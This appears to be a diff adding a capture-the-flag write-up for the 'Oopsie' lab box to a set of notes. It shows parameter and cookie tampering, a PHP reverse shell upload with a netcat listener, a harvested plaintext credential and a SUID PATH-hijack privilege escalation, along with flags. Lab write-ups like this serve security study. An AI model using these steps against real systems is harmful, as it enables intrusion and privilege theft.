@@ -2,7 +2,7 @@
 
 --------------------------------------------------------------------
 
-**TOOLS USED**: nmap, smbclient, impacket, netcat, winPEAS
+**TOOLS USED**: nmap, smbclient, impacket, netcat, winPEAS, Burp Suite
 
 **nmap**: network exploration tool and security / port scanner<br>
 
@@ -148,3 +148,104 @@ sudo python3 psexec.py administrator@10.129.100.57
 ```
 
 FLAG: b91ccec3305e98240082d4474b848528
+
+--------------------------------------------------------------------
+
+## OOPSIE BOX
+
+**TOOLS USED**: nmap, Burp Suite, netcat
+
+**IP Address**: 10.129.15.32
+
+```
+nmap -sC -sV -p- -oN archetype_nmap.txt 10.129.15.32
+```
+
+**EXPOSED PORT (SERVICE)**: 22 (ssh), 80 (http)
+
+Get sitemap and accessible directories from using Burp Suite:
+![Burp Site Map](./burp_spider.png)
+
+Can also do inspect element to find this.
+
+TARGET: http://10.129.15.32/cdn-cgi/login/
+
+Log in as guest, go to Account.<br>
+URL: http://10.129.15.32/cdn-cgi/login/admin.php?content=accounts&id=2
+
+Setting parameter id to 1 will give access to admin account page.
+
+ACCESS ID: 34322
+
+Use Burp Suite to intercept request to go to uploads page and edit cookie to give admin access:
+![Burp Site Map](./burp_cookie.png)
+
+Upload php reverse shell script
+
+```
+gobuster dir -u http://10.129.15.32 -w /usr/share/dirb/wordlists/common.txt
+```
+
+UPLOAD DIR: http://10.129.15.32/uploads
+
+```
+nc -nlvp 4444
+```
+
+Go to this url to trigger shell:
+http://10.129.15.32/uploads/payload.php
+
+SQL LOGIN (/var/www/html/cdn-cgi/login/db.php):
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+
+USER: robert<br>
+PASSWORD: M3g4C0rpUs3r!<br>
+USER.TXT: f2c74ee8db7983851ab2a96a44eb7981<br>
+
+To see who has /bin/bash permission:
+```
+cat /etc/passwd
+```
+
+To get interactive shell:
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```
+sudo robert
+```
+To see if robert has any sudo permissions and then see robert's permissions:
+```
+sudo -l
+id
+```
+
+PERMISSIONS: uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)<br>
+TARGET: bugtracker group
+
+Find files owned by bugtracker group
+```
+find -group bugtracker
+```
+
+TARGET: /usr/bin/bugtracker
+PERMISSIONS: -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+
+root bit is set so file will always run as root.<br>
+
+bugtracker program gives this error when bug not found:<br>
+cat: /root/reports/32322322323: No such file or directory<br>
+We can exploit the cat command because it is run insecurely
+
+```
+cd /tmp
+echo "bin/sh" > cat
+chmod +x cat
+export PATH=/tmp:$PATH # adds /tmp to the PATH variable
+bugtracker
+```
+
+FLAG: af13b0bee69f8a877c3faf667f7beacf
